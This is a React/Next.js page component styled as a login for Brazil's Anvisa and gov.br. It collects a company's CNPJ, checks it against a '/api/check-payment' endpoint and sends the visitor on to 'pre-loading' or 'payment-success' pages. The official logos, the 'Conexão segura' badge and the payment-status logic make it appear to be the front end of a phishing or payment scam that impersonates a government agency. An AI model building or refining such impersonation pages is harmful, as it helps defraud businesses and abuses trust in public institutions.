"use client"

import type React from "react"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Shield, Bell, User, LogIn, Lock } from "lucide-react"

export default function HomePage() {
  const [cnpj, setCnpj] = useState("")
  const [errors, setErrors] = useState({
    empty: false,
    invalid: false,
    minLength: false,
  })
  const router = useRouter()

  // CNPJ validation function
  const validateCNPJ = (cnpj: string): boolean => {
    cnpj = cnpj.replace(/[^\d]+/g, "")

    if (cnpj === "" || cnpj.length !== 14) return false

    // Check for known invalid CNPJs
    const invalidCNPJs = [
      "00000000000000",
      "11111111111111",
      "22222222222222",
      "33333333333333",
      "44444444444444",
      "55555555555555",
      "66666666666666",
      "77777777777777",
      "88888888888888",
      "99999999999999",
    ]

    if (invalidCNPJs.includes(cnpj)) return false

    // Validate check digits
    let tamanho = cnpj.length - 2
    let numeros = cnpj.substring(0, tamanho)
    const digitos = cnpj.substring(tamanho)
    let soma = 0
    let pos = tamanho - 7

    for (let i = tamanho; i >= 1; i--) {
      soma += Number.parseInt(numeros.charAt(tamanho - i)) * pos--
      if (pos < 2) pos = 9
    }

    let resultado = soma % 11 < 2 ? 0 : 11 - (soma % 11)
    if (resultado !== Number.parseInt(digitos.charAt(0))) return false

    tamanho = tamanho + 1
    numeros = cnpj.substring(0, tamanho)
    soma = 0
    pos = tamanho - 7

    for (let i = tamanho; i >= 1; i--) {
      soma += Number.parseInt(numeros.charAt(tamanho - i)) * pos--
      if (pos < 2) pos = 9
    }

    resultado = soma % 11 < 2 ? 0 : 11 - (soma % 11)
    if (resultado !== Number.parseInt(digitos.charAt(1))) return false

    return true
  }

  // Format CNPJ input
  const formatCNPJ = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    return numbers.replace(/(\d{2})(\d{3})(\d{3})(\d{4})(\d{2})/, "$1.$2.$3/$4-$5")
  }

  const handleCNPJChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCNPJ(e.target.value)
    setCnpj(formatted)
    setErrors({ empty: false, invalid: false, minLength: false })
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    // Reset errors
    setErrors({ empty: false, invalid: false, minLength: false })

    // Validate form
    if (!cnpj) {
      setErrors((prev) => ({ ...prev, empty: true }))
      return
    }

    if (cnpj.length < 18) {
      setErrors((prev) => ({ ...prev, minLength: true }))
      return
    }

    if (!validateCNPJ(cnpj)) {
      setErrors((prev) => ({ ...prev, invalid: true }))
      return
    }

    try {
      const response = await fetch("/api/check-payment", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ cnpj }),
      })

      if (response.ok) {
        const { hasPaid } = await response.json()

        if (hasPaid) {
          // Store CNPJ and redirect to success page
          sessionStorage.setItem("cnpj", cnpj)
          sessionStorage.setItem("alreadyPaid", "true")
          router.push("/payment-success")
          return
        }
      }
    } catch (error) {
      console.error("[v0] Error checking payment:", error)
    }

    // Store CNPJ and redirect to pre-loading page
    sessionStorage.setItem("cnpj", cnpj)
    router.push("/pre-loading")
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-100 via-indigo-50 to-slate-200 relative overflow-hidden">
      {/* Background Pattern */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-1/4 left-1/6 w-48 h-48 bg-blue-300 rounded-full mix-blend-multiply filter blur-2xl opacity-30 animate-pulse" />
        <div
          className="absolute top-3/4 right-1/4 w-36 h-36 bg-indigo-300 rounded-full mix-blend-multiply filter blur-2xl opacity-35 animate-pulse"
          style={{ animationDelay: "2s" }}
        />
        <div
          className="absolute bottom-1/3 left-1/2 w-32 h-32 bg-purple-300 rounded-full mix-blend-multiply filter blur-2xl opacity-25 animate-pulse"
          style={{ animationDelay: "4s" }}
        />
        <div
          className="absolute top-1/2 right-1/6 w-24 h-24 bg-cyan-300 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse"
          style={{ animationDelay: "1s" }}
        />
      </div>

      {/* Header */}
      <header className="fixed top-0 left-0 right-0 z-50 bg-white/85 backdrop-blur-md border-b border-white/30 shadow-lg">
        <div className="max-w-7xl mx-auto px-4 sm:px-6">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center space-x-4">
              <img src="/images/govbr-logo-large-CK1AxAnO.png" alt="gov.br" className="h-8" />
              <div className="hidden sm:block">
                <h1 className="text-lg font-semibold text-gray-900">Anvisa</h1>
                <p className="text-sm text-gray-600">Ministério da Saúde</p>
              </div>
            </div>

            <div className="flex items-center space-x-4">
              <button className="p-2 text-gray-600 hover:text-gray-900 relative">
                <Bell className="w-5 h-5" />
              </button>
              <div className="hidden md:block text-right">
                <p className="text-sm font-medium text-gray-900">Sistema</p>
                <p className="text-xs text-gray-600">gov.br</p>
              </div>
              <div className="w-10 h-10 rounded-full bg-gradient-to-r from-blue-500 to-indigo-600 flex items-center justify-center text-white font-semibold">
                <User className="w-5 h-5" />
              </div>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <div className="min-h-screen flex items-center justify-center relative z-10 p-4 pt-20">
        <div className="bg-white/85 backdrop-blur-md rounded-2xl p-8 max-w-md w-full mx-auto shadow-2xl border border-white/30 animate-in slide-in-from-bottom-4 duration-800">
          {/* Header */}
          <div className="text-center mb-8">
            <div className="mb-4">
              <img src="/images/govbr-logo-large-CK1AxAnO.png" alt="Gov.br" className="h-16 mx-auto" />
            </div>
            <h1 className="text-2xl font-bold text-gray-900 mb-2">Anvisa</h1>
            <p className="text-gray-600">Ministério da Saúde do Brasil</p>
          </div>

          {/* Security Notice */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
            <div className="flex items-start gap-3">
              <Shield className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
              <div className="text-sm">
                <p className="text-blue-800">
                  Ao prosseguir, você concorda com nossos <span className="font-medium">Termos de Uso</span> e{" "}
                  <span className="font-medium">Política de privacidade</span>.
                </p>
              </div>
            </div>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <Label htmlFor="cnpj" className="text-sm font-medium text-gray-700">
                Digite seu CNPJ para acessar
              </Label>

              <Input
                type="text"
                id="cnpj"
                value={cnpj}
                onChange={handleCNPJChange}
                placeholder="00.000.000/0000-00"
                maxLength={18}
                className={`w-full px-4 py-3 border rounded-lg shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all duration-300 ${
                  errors.empty || errors.invalid || errors.minLength
                    ? "border-red-500 ring-2 ring-red-500/20"
                    : "border-gray-300"
                }`}
                autoComplete="off"
              />

              {/* Error Messages */}
              <div className="space-y-1">
                {errors.empty && <span className="text-sm text-red-600">Por favor, digite seu CNPJ.</span>}
                {errors.minLength && <span className="text-sm text-red-600">O CNPJ deve conter 14 dígitos.</span>}
                {errors.invalid && <span className="text-sm text-red-600">O CNPJ informado é inválido.</span>}
              </div>
            </div>

            <Button
              type="submit"
              className="w-full py-3 px-6 rounded-lg font-semibold text-white bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 transition-all duration-300 focus:outline-none focus:ring-4 focus:ring-blue-300 transform hover:-translate-y-0.5 hover:shadow-lg"
            >
              <span className="flex items-center justify-center gap-2">
                <LogIn className="w-5 h-5" />
                ENTRAR COM GOV.BR
              </span>
            </Button>
          </form>

          {/* Footer Info */}
          <div className="mt-6 text-center">
            <div className="flex items-center justify-center gap-2 text-sm text-gray-500">
              <Lock className="w-4 h-4" />
              <span>Conexão segura</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
